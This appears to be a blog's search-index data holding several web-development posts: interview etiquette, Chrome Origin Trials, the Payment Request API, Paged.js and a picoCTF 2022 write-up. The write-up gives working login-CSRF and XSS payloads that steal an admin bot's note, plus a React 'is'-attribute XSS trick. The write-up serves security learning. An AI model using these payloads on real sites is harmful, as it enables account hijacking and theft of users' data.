that the questions asked later will be more in-depth and can directly get to the point. And the job seeker will know: Oh, he has read my resume. For example, my resume always includes a personal blog (actually here XD). If the interviewer has come to visit before I go for an interview, I will feel super touched, a feeling of “you are too thoughtful”. During the interviewFinally, the day of the interview has arrived. First of all, there are several situations that I think “absolutely cannot happen”: Let the interviewee wait. The interviewer cannot find the person. The first possibility is that in the previous step, the interview notification letter did not clearly state who to look for. Some companies may not have a switchboard or a dedicated receptionist, so who do you ask the job seeker to look for? It is best to write clearly on the notification letter, for example: After arriving at the company, tell the colleague closest to the door that you are here for an interview. This way, at least he knows who he should look for, instead of leaving the job seeker at a loss. What else is there: The manager is in a meeting, can you wait for a moment? If it’s within ten minutes, it’s okay, but if it takes too long, it’s not good. This is also disrespectful. The manager has a meeting today, so why come to me for an interview at this time? Can’t you make an appointment an hour or two later? Everyone knows that meetings are likely to be delayed, but this should be considered before scheduling the interview. If you’re not sure, don’t make an appointment. I have actually encountered the second situation. “The person who was supposed to interview you today went to a meeting, so let me interview you instead.” If I remember correctly, it was something like that… When encountering this situation, it is better not to tell the job seeker and just pretend that it was originally planned for me to interview them. If neither of the above situations occurs, the job seeker should smoothly meet with HR after arriving at the company. What should HR do at this time? Ask them to fill out information. Explain the interview process. Explain the company’s benefits. Ask if the job seeker has any questions (related to the company, within HR’s scope of response). Almost every company has item 1, but I’m not sure if it’s a legal restriction or a convention. There are a lot of troublesome things to fill out on the form, such as family information, address, etc. If it’s just a convention, I would suggest filling out only the necessary information to save interview time. Otherwise, it’s really annoying to fill out this long form every time. (But if there are relevant legal restrictions, there is no way.) I think item 2 is also very important. When I went to the interview event before, the HR person explained the interview process to me very professionally. It’s been a while, so I forgot the details, but it’s probably like this: Our company’s interview process has three stages. The first stage is with me. I will explain some company benefits and related situations to you, and you can also ask me questions related to the company. The second stage is with the Android engineer, mainly discussing your technical abilities. The third stage (if you pass the previous stage) is with the CEO, which is the final stage. For item 3, what is generally stipulated by the Labor Standards Act does not need to be mentioned, and only additional benefits are worth mentioning. Company benefits should be generously made known to job seekers. Some companies, for some reason, just don’t explain them clearly. Like the company I’m currently working for: Longzhong Network, the company benefits include: 12 days of annual leave (the Labor Standards Act stipulates 7 days). Free breakfast. Subsidies for overseas travel. TOEIC credit subsidies (salary increase based on performance). These are the contents that HR can explain to job seekers first. After HR finishes the interview, the person responsible for the job-related duties will come to interview. The questions asked will be about professional skills. Because this article is about “process” rather than content, I will skip this part. After the interviewAfter going through many difficulties, the interview finally ended. I think that at the end of the interview, the interviewer can provide more useful information instead of the old cliche “I will discuss with my colleagues and notify you later.” Notification time for interview results. Will you be notified if you are not selected? After the interview, the most important thing for job seekers is the interview results. I think it is helpful to notify them of the above two points. Item 1 can avoid making job seekers wait for a long time. Item 2 is better than “silent rejection”, and a thank-you letter with an explanation would be better if possible. SummaryAs the saying goes: Treat others as you would like to be treated; adjust your company’s interview process to what you would like to experience. Putting the above into a summary, it would be something like this (written in the first person): One day, I submitted my resume to Company A for the position of engineer, and a few days later, I received a reply: Hello, we have received your resume. Our company is very interested in your professional skills and would like to invite you for an interview.Company location: 14th floor, No. 3 Taipei Road, Taipei City (above FamilyMart convenience store, exchange certificate at the counter on the first floor, take the elevator to the 14th floor and turn right, tell the receptionist that you are here for an interview)Position applied for: EngineerContact number: 02-2222-2222 (#621) Mr. ChenTime: Please choose three time slots that are convenient for you from the following and reply to us. We will confirm and reply to you later.11:00 a.m. on 1&#x2F;13:00 p.m. on 1&#x2F;111:00 a.m. on 1&#x2F;43:00 p.m. on 1&#x2F;45:00 p.m. on 1&#x2F;411:00 a.m. on 1&#x2F;511:00 a.m. on 1&#x2F;6…(omitted) So I chose three time slots and replied, and soon received a reply: Hello, here is your interview information:Company location: 14th floor, No. 3 Taipei Road, Taipei City (above FamilyMart convenience store, exchange certificate at the counter on the first floor, take the elevator to the 14th floor and turn right, tell the receptionist that you are here for an interview)Position applied for: EngineerContact number: 02-2222-2222 (#621) Mr. ChenTime: 11:00 a.m. on 1&#x2F;1The interview process takes about 1 hour. The first 20 minutes will be used to fill out basic information and a written test (basic programming ability). You don’t need to bring your resume, we will provide it; but you can bring any materials that can prove your professional skills or work results. When I went to the interview on 1&#x2F;1, HR asked me to fill out information and take the written test in the conference room. After I finished, she roughly explained the company’s situation, benefits, and the interview process. For example, there are three stages of the interview in total, and finally let me ask questions. After confirming that there were no problems, the technical person in charge came to interview me. After the interview with the technical person in charge, he said to me: Today’s interview ends here. We will discuss whether to invite you to participate in the third round of interviews. The result will be notified to you in about 3 days, and no later than next Friday. Regardless of the result, we will send a letter to notify you. After about five days, I received an email like this: Hello, thank you for applying for the engineer position at our company. Unfortunately, we believe that your professional knowledge does not meet the standards for this position.To avoid delaying your opportunities with other companies, we are notifying you with this email.(The following official and formal language is omitted) If a company interviews me like this, even if I am not accepted, I will still recommend this company.This is not a matter of acceptance or rejection, but a matter of respect.","link":"/2016/01/20/en/my-ideal-interview-process/"},{"title":"Trying out new features with Chrome Origin Trials","text":"If your website wants to experience new features that have not yet been officially launched by the browser, what should you do? Usually, these features are already available, but not yet open. Therefore, browsers provide some flags that can be turned on and off. As long as the switch is turned on, you can experience the new features in advance. However, we usually cannot ask users to turn on the switch themselves. Therefore, Chrome provides a mechanism called origin trials. You can register on the website to obtain a set of tokens. After setting it up, if the user visits your website with Chrome, the new feature will be turned on, allowing your website to use it. This article will briefly introduce how to use this mechanism. Choosing featuresThis page lists all the features currently provided by Chrome Origin Trials: https://developer.chrome.com/origintrials/#/trials/active After clicking on each feature, there will be detailed explanations. For example, if we click on “App History API”, we will see a detailed explanation: Above will briefly introduce what this feature does, as well as the open version and end date. Usually, two resources will be provided, such as “Learn More”. After clicking it, it may link to an article introducing the basic usage of this feature, like this article: Modern client-side routing: the App History API, which introduces the basic usage of App History API. The other resource is Chrome Platform Status. After clicking it, a more detailed page will appear, which gives the current status and expected release time, as well as the link to the spec, and whether other browsers will follow this feature: Most of the features that will be opened to origin trials are new features, but a few will be features that have been deprecated or are about to be deprecated. Why is this? Because some websites may need more time to update, they can come here to apply for origin trials, and the browser will keep the old features first, allowing the website more time to update. Therefore, origin trials not only provide new features, but also features that have been deprecated. In short, if you are curious about which new features can be tried out, you can come to this website to find out. Trying out featuresNext, let’s actually try out the App History API feature. This new feature is designed for SPAs, because when the existing History API was born, SPAs had not yet become popular, so many requirements were not met and a new set of APIs was needed. For detailed introduction, please refer to: Modern client-side routing: the App History API In short, if this feature can be used, we should be able to access appHistory. Now, because the feature has not been opened, accessing it will only result in the error: Uncaught ReferenceError: appHistory is not defined. After selecting the desired feature on the Chrome Origin Trials page, click REGISTER, and you will be taken to the registration page. Then you need to enter the origin of the website you want to try out, after all, it’s called origin trials, which means “specify which origins can try out”, like this: After the application is completed, you will be given a set of tokens and an expiration time, which will tell you when you can use it, like this: Next, it’s very simple, just add a meta tag to the page you want to try out: &lt;meta http-equiv=\"origin-trial\" content=\"TOKEN\"> You can also use the HTTP header: Origin-Trial: TOKEN For the convenience of the demo, I have prepared a page with the following content: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"robots\" content=\"noindex\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;meta http-equiv=\"origin-trial\" content=\"AnmLpSv09ah5QRsTiszCUGI8WzgiH5OByD2I/kQjnbSSmN2DMnuvRsbPWfqN7QmDJbNH6cUBvsay+UlJBwQyXwcAAABXeyJvcmlnaW4iOiJodHRwczovL2Fzeng4NzQxMC5naXRodWIuaW86NDQzIiwiZmVhdHVyZSI6IkFwcEhpc3RvcnkiLCJleHBpcnkiOjE2NDc5OTM1OTl9\"> &lt;/head> &lt;body> origin trial demo &lt;script> if (window.appHistory) &#123; document.writeln('appHistory exists!') &#125; else &#123; document.writeln('appHistory is not defined') &#125; &lt;/script> &lt;/body> &lt;/html> It will detect whether there is an appHistory and display the result on the screen. After setting up, visit this page: https://aszx87410.github.io/demo/misc/origin-trial.html If you open it with a browser other than Chrome, you will see “appHistory is not defined”. If you use Chrome, you should see “appHistory exists!”. Open devtool -&gt; Application -&gt; Frames -&gt; top, and you can see that we have successfully enabled origin trials: Yes, the whole process is that simple. ConclusionThis article briefly introduces the mechanism of Origin Trials. Through this mechanism, you can apply for a set of tokens and put them on the website. Then, Chrome users can try new features in advance. For example, the three.js example page uses origin trial to enable WebGPU-related functions: three.js&#x2F;examples&#x2F;webgpu_skinning.html In addition, even if you don’t want to experience new features, you can occasionally come here to take a look. Just by looking at it, you can gain a lot. For example, I saw “App History API”, “Private Network Access from non-secure contexts”, and “User Agent Reduction” from the list, which I have never heard of before.","link":"/2022/02/02/en/origin-trials-try-new-feature/"},{"title":"Unified Web Payment Interface: Payment Request API","text":"IntroductionI came across an article on Hacker News about Payment Request API — Now Being Implemented in All Major Browsers, which means that Payment Request API will be implemented in mainstream browsers. Before that, I had never heard of it and had no idea what it was doing. But after a little research, I found out that it is the future of web payment interface. Introduction to Payment Request APIBefore understanding a new thing, I usually start with the “purpose”. If you know what this thing is born to solve, you can have the most basic understanding of it. The reason for the birth of Payment Request API is simple, it is to solve the payment problem, especially on mobile devices. Let’s not talk about mobile devices first, let’s talk about payment on computers. Now every shopping website has different payment interfaces, connected to different payment service providers. Suppose I bought “Critique of Pure Reason” on Shopee, filled in my credit card number and shipping address, and Shopee kindly remembered it for me, so the next time I shop, I don’t have to fill in the shipping address again. However, if today a PChome merchant spends money to promote various discounts, and I decide to shop on PChome, I will have to fill in my credit card number and shipping address again for “The Interpretation of Dreams”. What is the problem? The problem is that the checkout process and interface of each company and website are different, although they are similar, but those data cannot be shared. Even if I fill in the shipping address on 100 websites, I still have to fill it in again on the 101st website because they don’t have my data. Is there anything in common with the above? Yes, you are using the same browser to shop. Browser’s First Attempt: Auto-fillThe scenario mentioned above is not accurate because you should find that the browser will automatically remember your address and credit card, so you can easily use the auto-fill function. For example, when swiping a card, as long as you swipe it once, Chrome can remember the card information in the browser. The next time you swipe a card on another website, you only need to click on the input box of the card number, and Chrome will prompt you to use the previous card to pay. The same goes for addresses, which are remembered by the browser, so you only need to fill them in once, and Chrome will automatically fill them in for you in the future. However, there is still a problem, that is, the checkout process and interface are still not unified, and everyone has their own different implementations, and some payment interfaces are simply unbearable, especially on mobile devices! According to Google’s statistics, 65.9% of users leave before completing all the processes when shopping on mobile devices. This has exceeded half of the users, indicating that many websites still have a lot of room for improvement in the mobile payment interface. This time, the browser decided to jump down and solve this problem by itself. Browser: Leave it to me!How does the browser solve this pain point? Simple! Just let the browser provide a unified checkout interface, and even the process is unified. The merchant’s webpage can bring in different parameters according to different needs, but in the end, it calls the API provided by the browser (that is, our protagonist today: Payment Request API) to call up the native interface of the browser. When this API becomes popular and everyone finds it easier to use, all websites will follow suit and adopt the same method. This ensures that the payment process of all websites is unified. So what is Payment Request API? Simply put, it is an API provided by the browser. When the webpage calls it with JavaScript, the native checkout interface of the browser will appear, which is used to replace the original checkout process of the merchant. You can understand it directly by looking at a picture: This is what it looks like after calling the API. One thing to note is that the Payment Request API is “completely unrelated” to the backend, and the backend can receive data as usual. The difference is in the frontend, where the checkout pages that you used to write can now be rendered by the browser’s native UI, and you only need to call the Payment Request API. After calling the API, you can obtain the data filled in by the user and send it to the server as before. However, it should be noted that this API is not yet widely used. According to the data from caniuse.com, only Chrome 61, Edge 15, and Opera 48 or above support it, and other browsers still need to wait. Usage ProcessAfter saying so much, let’s actually run the process! First, we create a simple demo page to detect whether Payment Request is supported and place the purchase button and return results: Step 1: Create Payment Request ObjectPaymentRequest accepts three parameters: payment method, transaction information, and others. var request = new PaymentRequest( methodData, // Supported payment methods details, // Detailed transaction information options // Others, such as shipping methods, etc. ); First, we implement a simple function to return the created PaymentRequest: function createPaymentRequest () &#123; var methodData = [&#123; supportedMethods: ['basic-card'], // Support credit card data: &#123; // Specify more detailed information supportedNetworks: ['jcb', 'mastercard', 'visa'], supportedTypes: ['debit', 'credit', 'prepaid'] &#125;, &#125;]; var details = &#123; displayItems: [ // Purchased items &#123; label: \"TechBridge Weekly Professional Edition for one year\", amount: &#123; currency: \"TWD\", value : \"3000.00\" &#125; &#125;, &#123; label: \"Early bird discount\", amount: &#123; currency: \"TWD\", value : \"-300.00\" &#125; &#125; ], total: &#123; label: \"Total\", amount: &#123; currency: \"TWD\", value : \"2700.00\" &#125; &#125; &#125;; return new PaymentRequest(methodData, details); &#125; One thing to note here is that the total amount in total will not be automatically calculated by the system, so even if the sum above is 2700, you can enter other numbers. Another condition is that this API does not support refunds, so the total must be positive. However, each item can be negative, so you can put some discount-related things. Step 2: Call the API and Display the Checkout PageAfter creating the PaymentRequest, you can use .show() to display the checkout UI, which will return a Promise. After using it, you can obtain the relevant information of the user. We will perform the checkout process after clicking the purchase button. function onClick () &#123; var request = createPaymentRequest(); request.show().then(function(PaymentResponse) &#123; handleResponse(PaymentResponse); &#125;).catch(function(err) &#123; console.log(err); &#125;); &#125; Step 3: Process Data and Return ResultsThe last step is to process the data obtained from the previous step, send that information to the server to complete the checkout process, and return the result to display success or failure on the UI. Since this is just an example, we will skip the above steps and directly convert the data obtained from the previous step into JSON to display it. function showResponse (response) &#123; $res.innerHTML = JSON.stringify(response, undefined, 2); &#125; function handleResponse (paymentResponse) &#123; // You can return the result to the server here // This is just an example, so we will display the data directly showResponse(paymentResponse); // Simulate API delay setTimeout(function () &#123; // Checkout successful paymentResponse.complete(\"success\"); &#125;, 2000); &#125; (The card number here is randomly generated from http://www.getcreditcardnumbers.com/) With just the simple three steps above, you can obtain user data and complete the checkout process. The advantage of using the Payment Request API over the proprietary checkout process built by each website is that it can provide users with a native checkout experience, thereby increasing conversion rates. The most important part of the above three steps is the part where the input parameters are passed in. There are many details that can be adjusted here, such as currency type, shipping address requirements, and whether to accept or reject based on the address selected by the user (for example, if you do not accept delivery to foreign countries, you can judge it there). Payment methods can also specify certain credit cards or even decide whether to support debit cards. If you are interested in these details, you can refer to the very detailed tutorial provided by Google: Deep Dive into the Payment Request API. Native Checkout UIIf you want to run the checkout process yourself, you can go directly to the demo webpage to try it out. Here, I will directly show you the checkout process on the computer and mobile phone by taking screenshots. ComputerScreen after clicking the button: Click into the order summary: Add credit card: Add address: After clicking pay, enter the last three digits: Checkout failed: MobileScreen after clicking the button: Click into order summary: Add credit card: Add address: Checkout failed: SummaryPayment Request API is being implemented by other browsers (such as Safari), and it can be expected to be widely supported in the future. In fact, the foreign payment processor Stripe already supports the use of Payment Request API. The PaymentRequest Sample website also provides more diverse examples. The main purpose of this article is to introduce this new standard to everyone. If you are interested in further research, there are many related resources attached below. References: MDN - Payment Request API Deep Dive into the Payment Request API Introducing the Payment Request API PaymentRequest Credit Cards Sample w3c&#x2F;payment-request-info FAQ","link":"/2017/10/04/en/payment-request-api/"},{"title":"picoCTF 2022 Notes","text":"There were two difficult Web questions this time. I solved one, and the other one was unsolvable, but the solution is worth a look. Here’s a brief summary. NotedLink: https://play.picoctf.org/practice/challenge/282 In short, this is a common system for adding notes. You can see all your notes on the &#x2F;notes page, and there is a self-XSS vulnerability. Now, an admin who is logged in will visit the URL you provide, and you need to find a way to get the admin’s note content. Code: fastify.after(() => &#123; fastify.get('/', (req, res) => &#123; if (req.user) return res.redirect('/notes'); return res.view('login'); &#125;); fastify.post('/login', &#123; schema: userSchema &#125;, async (req, res) => &#123; let &#123; username, password &#125; = req.body; username = username.toLowerCase(); let user = await User.findOne(&#123; where: &#123; username &#125;&#125;); if (user === null) &#123; return res.status(400).send('User not found'); &#125; if (!(await argon2.verify(user.password, password))) &#123; return res.status(400).send('Wrong password!'); &#125; req.session.set('user', user.username); return res.redirect('/notes'); &#125;); fastify.get('/register', (req, res) => &#123; return res.view('register'); &#125;); fastify.post('/register', &#123; schema: userSchema &#125;, async (req, res) => &#123; let &#123; username, password &#125; = req.body; username = username.toLowerCase(); let user = await User.findOne(&#123; where: &#123; username &#125;&#125;); if (user) &#123; return res.status(400).send('User already exists!'); &#125; await User.create(&#123; username, password: await argon2.hash(password) &#125;); req.session.set('user', username); return res.redirect('/notes'); &#125;); fastify.get('/notes', auth(async (req, res) => &#123; return res.view('notes', &#123; notes: req.user.notes, csrf: await res.generateCsrf() &#125;); &#125;)); fastify.get('/new', auth(async (req, res) => &#123; return res.view('new', &#123; csrf: await res.generateCsrf() &#125;); &#125;)); fastify.post('/new', &#123; schema: noteSchema, preHandler: fastify.csrfProtection &#125;, auth(async (req, res) => &#123; let &#123; title, content &#125; = req.body; await Note.create(&#123; title, content, userId: req.user.id &#125;); return res.redirect('/notes'); &#125;)); fastify.post('/delete', &#123; schema: deleteSchema, preHandler: fastify.csrfProtection &#125;, auth(async (req, res) => &#123; let &#123; id &#125; = req.body; let deleted = false; for (let note of req.user.notes) &#123; if (note.id === id) &#123; await note.destroy(); deleted = true; &#125; &#125; if (deleted) &#123; return res.redirect('/notes'); &#125; else &#123; res.status(400).send('Note not found!'); &#125; &#125;)); fastify.get('/report', auth(async (req, res) => &#123; return res.view('report', &#123; csrf: await res.generateCsrf() &#125;); &#125;)); fastify.post('/report', &#123; schema: reportSchema, preHandler: fastify.csrfProtection &#125;, auth((req, res) => &#123; let &#123; url &#125; = req.body; if (report.open) &#123; return res.send('Only one browser can be open at a time!'); &#125; else &#123; report.run(url); &#125; return res.send('URL has been reported.'); &#125;)); &#125;) Bot code: const crypto = require('crypto'); const puppeteer = require('puppeteer'); async function run(url) &#123; let browser; try &#123; module.exports.open = true; browser = await puppeteer.launch(&#123; headless: true, pipe: true, args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'], slowMo: 10 &#125;); let page = (await browser.pages())[0] await page.goto('http://0.0.0.0:8080/register'); await page.type('[name=\"username\"]', crypto.randomBytes(8).toString('hex')); await page.type('[name=\"password\"]', crypto.randomBytes(8).toString('hex')); await Promise.all([ page.click('[type=\"submit\"]'), page.waitForNavigation(&#123; waituntil: 'domcontentloaded' &#125;) ]); await page.goto('http://0.0.0.0:8080/new'); await page.type('[name=\"title\"]', 'flag'); await page.type('[name=\"content\"]', process.env.FLAG ?? 'ctf&#123;flag&#125;'); await Promise.all([ page.click('[type=\"submit\"]'), page.waitForNavigation(&#123; waituntil: 'domcontentloaded' &#125;) ]); await page.goto('about:blank') await page.goto(url); await page.waitForTimeout(7500); await browser.close(); &#125; catch(e) &#123; console.error(e); try &#123; await browser.close() &#125; catch(e) &#123;&#125; &#125; module.exports.open = false; &#125; module.exports = &#123; open: false, run &#125; The problem statement says that the admin bot for this question does not have an external connection function, so some additional difficulty has been added (but it seems that it was added back before the competition started, according to Discord). But let’s not discuss this for now, let’s discuss other things. This question has a CSRF token to prevent CSRF, but the login part does not, so you can use CSRF to log in and execute XSS on the admin. If the same-site cookie is not set, it is easy to iframe, like this: &lt;iframe name=f onload=run() src=\"http://0.0.0.0:8080/notes\">&lt;/iframe> &lt;form id=form action=\"/login\" target=\"_blank\"> &lt;input name=\"username\" value=\"user01\"> &lt;input name=\"password\" value=\"password\"> &lt;/form> &lt;script> function run() &#123; form.submit(); &#125; &lt;/script> First, open an iframe on the page, and the admin’s notes will be inside. Then use form CSRF to open a new window. Then, just create an XSS in your own account, and use window.opener.frames[&#39;f&#39;].document.body to get the page content. Although the newly opened page is not the same origin as window.opener, it can still be accessed because it is the same origin as window.opener.frames[&#39;f&#39;]. However, the biggest problem with this question is Chrome’s default Lax, so the iframe does not carry cookies, so it cannot be used. A very intuitive solution is to use window.open, like this: &lt;form id=form action=\"/login\" target=\"_blank\"> &lt;input name=\"username\" value=\"user01\"> &lt;input name=\"password\" value=\"password\"> &lt;/form> &lt;script> win = window.open('http://0.0.0.0:8080/notes') form.submit() &lt;/script> But the biggest problem is that you cannot access the opened window using window.opener.win in the new window because it is not the same origin as window.opener. If the two new windows cannot communicate with each other, what should you do? After thinking for a while, I suddenly had an idea: “Why not just make window.opener the page you want to get?” Like this: &lt;form id=form action=\"/login\" target=\"_blank\"> &lt;input name=\"username\" value=\"user01\"> &lt;input name=\"password\" value=\"password\"> &lt;/form> &lt;script> form.submit() location = 'http://0.0.0.0:8080/notes' &lt;/script> It feels like a race condition. After the form is submitted, the page jumps immediately. At this time, because the new login has not been completed, it is still the admin’s session, so you can directly get the things in window.opener.document after the new window is logged in. If there is a network connection, it is done. In the case of no external connection, it can be found that the admin bot does not check the URL, so you can pass javascript: or data: and other things to it, and the part that returns the flag can be directly added as a new note. To make the admin bot visit the following, just load the html using data:text/html: data:text&#x2F;html,&lt;form id&#x3D;f method&#x3D;POST action&#x3D;http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;login target&#x3D;new_window&gt;&lt;input name&#x3D;username value&#x3D;user01&gt;&lt;input name&#x3D;password value&#x3D;password&gt;&lt;&#x2F;form&gt;&lt;script&gt;f.submit();location&#x3D;&#39;http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;notes&#39;&lt;&#x2F;script&gt; XSS payload, just open a new window to do it, or you can use an iframe. &lt;script> setTimeout(() => &#123; var flag = window.opener.document.body.innerText var win = window.open('/new'); setTimeout(() => &#123; win.document.querySelector('textarea[name=content]').value = flag; win.document.querySelector('form').submit() &#125;, 2000) &#125;, 2000) &lt;/script> Another solutionUsing the tricks I learned a few days ago in iframe and window.open black magic, that is, “when opening a window with the same name, you will get a reference instead of opening a new window”, so the two new windows can communicate with each other. &lt;form id=form action=\"/login\" target=\"_blank\"> &lt;input name=\"username\" value=\"user01\"> &lt;input name=\"password\" value=\"password\"> &lt;/form> &lt;script> window.open('http://0.0.0.0:8080/notes', 'flag') form.submit() &lt;/script> The XSS part is written like this: &lt;script> var flagWin = window.open('xxx:abdef', 'flag') setTimeout(() => &#123; var flag = flagWin.document.body.innerText var win = window.open('/new'); setTimeout(() => &#123; win.document.querySelector('textarea[name=content]').value = flag; win.document.querySelector('form').submit() &#125;, 2000) &#125;, 2000) &lt;/script> A similar solution was used in this article: https://github.com/Scoder12/ctf/blob/main/PicoCTF%202022/web_noted.md Live ArtLink: https://play.picoctf.org/practice/challenge/277?page=1&amp;search=live I haven’t reproduced this problem myself yet, and the solutions are all from this article picoCTF 2022 WriteUps. I’ll briefly summarize it. There are two main vulnerabilities. Confusion of props caused by improper component switching Attacking React using the is attribute The second point is particularly interesting, so I’ll talk about it here. What’s wrong with the React app below? export default function App() &#123; const params = new URLSearchParams(location.search); let obj = &#123;&#125;; params.forEach(function (value, key) &#123; obj[key] = value; &#125;); return ( &lt;div className=\"App\"> &lt;h1>Demo&lt;/h1> &lt;img &#123;...obj&#125; /> &lt;/div> ); &#125; Here, we just turn the query string on the address bar into an object and pass it to img. The default usage of URLSearchParams does not support arrays and objects, so it is impossible to generate dangerouslySetInnerHTML: &#123; __html: &#39;..&#39;&#125;. In other words, if you can control the props of elements in React render today, but the value can only be a string, what can you do? When React sets attributes, if you write &lt;img onError=&quot;alert(1)&quot;&gt;, an error message will pop up: Expected &#96;onError&#96; listener to be a function, instead got a value of &#96;string&#96; type. If you change it to lowercase, you will get a warning: Warning: Invalid event handler property onerror. Did you mean onError? The relevant checks are all here: https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/shared/ReactDOMUnknownPropertyHook.js#L275 export function validateProperties(type, props, eventRegistry) &#123; if (isCustomComponent(type, props)) &#123; return; &#125; warnUnknownProperties(type, props, eventRegistry); &#125; And here you can see a isCustomComponent judgment, the code is here: https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/shared/isCustomComponent.js function isCustomComponent(tagName: string, props: Object) &#123; if (tagName.indexOf('-') === -1) &#123; return typeof props.is === 'string'; &#125; switch (tagName) &#123; // These are reserved SVG and MathML elements. // We don't mind this list too much because we expect it to never grow. // The alternative is to track the namespace in a few places which is convoluted. // https://w3c.github.io/webcomponents/spec/custom/#custom-elements-core-concepts case 'annotation-xml': case 'color-profile': case 'font-face': case 'font-face-src': case 'font-face-uri': case 'font-face-format': case 'font-face-name': case 'missing-glyph': return false; default: return true; &#125; &#125; If the is in props is a string, it will be true. And React also has some checks when setting attributes: https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/client/DOMPropertyOperations.js#L151 Simply put, if it is a custom element (props.is is a string), many attributes will be set directly. So, if you have the following code: function App() &#123; return ( &lt;img src=\"x\" onerror=\"alert(1)\" is=\"abc\" /> ) &#125; XSS can be triggered! Because of the is, React directly sets the onerror attribute. I’m so excited! This is the first time I’ve learned about this feature after writing React for so long, and there’s another attack surface for attacking React apps.","link":"/2022/04/10/en/picoctf-2022-writeup/"},{"title":"Creating HTML Web Pages Suitable for Printing as PDFs with Paged.js","text":"IntroductionI was recently tasked with generating a PDF report. There are many ways to create a PDF, such as using Word and then converting it to PDF. However, my first thought was to write it as a web page and then use the print function to convert it to PDF. At my previous company, I saw a project that used JS to generate PDFs using PDFKit. While it had a high degree of flexibility, I found it difficult to maintain. The reason is that using this tool is like drawing a PDF, and you have to specify (x, y) coordinates to draw something. Changing a small part may require changing many lines of code. At the time, I thought, why not just use the simplest HTML + CSS, cut the layout, and then convert it to PDF? If you don’t want to convert it manually, you can also use headless chrome to convert it. Because it is a web page, it should be easy to maintain. Moreover, because the layout is done using HTML and CSS, it should be much simpler than drawing. It wasn’t until I later encountered web-to-PDF conversion that I realized things weren’t as simple as I thought. ObjectiveIt is important to know what the final report will look like so that you can evaluate whether each technology can meet this requirement. First, there must be a cover page without headers, footers, or page numbers, and the content must be centered. Second, you should be able to customize the header and page number format for each page and set the footer, like this: Third, if a table spans multiple pages, the table head should be automatically repeated: Or you can directly see what the final PDF looks like: https://aszx87410.github.io/demo/print/print_demo.pdf Once you know the objective, you can study how to achieve these functions. HTML Web Page to PDF - Using Native Functionality @media printBecause I am not familiar with this area, I first Googled some Chinese articles, including: CSS - Web Page Printing and Style Actually, the Heart of CSS Still Lives in Print It turns out that front-end web page printing is not just window.print() @media print, who are you? About @media print Setting Web Page Printing Styles via CSS Print The key is to use CSS @media print to do the settings, and then you can set when to change pages, and remember to check some settings to display the background. I tried these methods myself and found that they can handle basic requirements, but if the requirements are a bit more complex, they won’t work. For example, how do I customize the header and footer for each page? The header and footer of each page may be different. If I can plan how much content per page in advance, there may be a chance to solve it, but what if I can’t? For example, if I have a long list, I don’t know how many pages there will be, what should I do? Regarding the header and footer, I found this article: The Ultimate Print HTML Template with Header &amp; Footer, which was helpful, but it couldn’t solve the page number problem. The above practices rely on selecting the default page numbers when printing, and the title is the webpage’s title or URL. How can I customize these styles? For example, if I want to change the position of the page numbers, is it possible? Later, I searched the internet and found that these situations cannot be solved by native CSS. So I changed my approach to “first print a PDF without page numbers using HTML, and then process it from the backend.” Since there is already a PDF, it is natural to know how many pages there are, and then you can use PDFKit or other libraries as mentioned earlier. This means that you first convert it to PDF, then process it, and you need two programs. I also found a set of WeasyPrint, which seems to be able to customize headers, footers, and page numbers, but it is still not an ideal solution. Just when I started to think, “It seems that these cannot be done with only front-end web pages,” the savior appeared. Paged.js, the best solution for webpage printing layoutPaged.js introduces itself as: Paged.js is a free and open source JavaScript library that paginates content in the browser to create PDF output from any HTML content. This means you can design works for print (eg. books) using HTML and CSS! Paged.js follows the Paged Media standards published by the W3C (ie the Paged Media Module, and the Generated Content for Paged Media Module). In effect Paged.js acts as a polyfill for the CSS modules to print content using features that are not yet natively supported by browsers. In short, Paged.js is an open-source JavaScript library used to help you print PDFs. Strictly speaking, many parts of it are polyfills. In fact, W3C already has some CSS properties responsible for printing, but they are still in the draft stage, so browsers have not implemented them yet, so they need to rely on Paged.js to polyfill. Let me show you what can be achieved with Paged.js: Demo website: https://aszx87410.github.io/demo/print/print.html Generated PDF: https://aszx87410.github.io/demo/print/print_demo.pdf If you want to learn how to use Paged.js, I highly recommend reading the official documentation because all the features are written there. This article just wants to let everyone know that there is this solution, so I won’t talk too much about it. Below, I will briefly explain how I implemented each feature I wanted. It’s a bit difficult to explain these features with just pictures and text, so I suggest that after reading this, go directly to the source code of the demo website above. I think it will be easier to understand. Customize each pageNative CSS seems to only adjust the pages uniformly, but Paged.js supports various pages, such as: @page &#123; size: A4; margin-top: 20mm; margin-bottom: 20mm; margin-left: 20mm; margin-right: 20mm; padding-top: 2rem; &#125; @page:nth(1) &#123; padding-top: 0; &#125; I first adjusted the margin and padding uniformly for all pages, but canceled the padding-top for the first page because the first page is the cover and does not need padding. If you don’t want to use page numbers as selectors, you can also directly name the pages, like this: &lt;div class=\"page-cover\"> ... &lt;/div> .page-cover &#123; page: coverPage; &#125; @page coverPage &#123; padding-top: 0; &#125; By doing this, you can control the page style for specific types of pages. Customize headers and footersPaged.js will automatically paginate your content and add default layout and CSS to each page. After modification, each page will look like this (image from the official website): The page area is your content, and other areas are block names. You can use CSS to decide what to put in these blocks. For example: @page &#123; @top-center &#123; content: \"hello\"; &#125; &#125; If you write it like this, the word “hello” will appear in the middle of the top of each page. Therefore, through this CSS, it is very easy to achieve the function of customizing headers and footers. However, this is only the most basic function, and the exciting part is coming up. Many times, text alone is not enough. We also want to add some styles or even images. Moreover, the headers and footers of each page may be different. For example, the title of this page may be A, and the next page may be B. How do we handle this? In Paged.js, there is a concept called “running headers&#x2F;footers”, which can be used to achieve dynamic headers and footers. The CSS we just wrote originally had fixed content, but now we can change it: @page &#123; @top-center &#123; content: element(title); &#125; &#125; If we write it like this, the content in the middle will be an element called “title”. What is this element? Just specify it with CSS: .title &#123; position: running(title); color: white; font-size: 1.25rem; &#125; Here is a position value that you may not have seen before, called running(title), which means that the .title element is set as a running title, corresponding to the element(title) we just wrote. Therefore, as long as the title of each page is placed in the HTML, it will automatically fetch its content and place it where you want it. &lt;div class=\"page\"> &lt;div class=\"title\">這是第一頁標題&lt;/div> 